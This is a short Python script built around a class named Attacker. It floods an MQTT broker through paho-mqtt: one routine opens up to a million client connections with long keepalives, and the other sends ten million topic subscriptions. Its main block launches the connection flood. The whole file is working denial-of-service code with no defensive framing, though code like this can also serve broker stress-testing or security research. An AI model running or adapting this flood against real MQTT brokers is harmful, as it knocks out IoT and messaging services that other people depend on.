import paho.mqtt.client
from Client import Client

class Attacker:
    def __init__(self) -> None:
        pass

    def launch_CONNECT(self):
        count = 0
        for i in range(1000000):
            client = Client()
            count+=1
            print(count)
            client.connect_Client(kalive=3600)
            client.start_Client_Loop()
    def launch_SUB(self):
        client = Client()
        client.connect_Client()
        client.start_Client_Loop()
        for i in range(10000):
            for j in range(1000):
                client.subscribe(str(j))

if __name__ == "__main__":
    att = Attacker()
    att.launch_CONNECT()
    
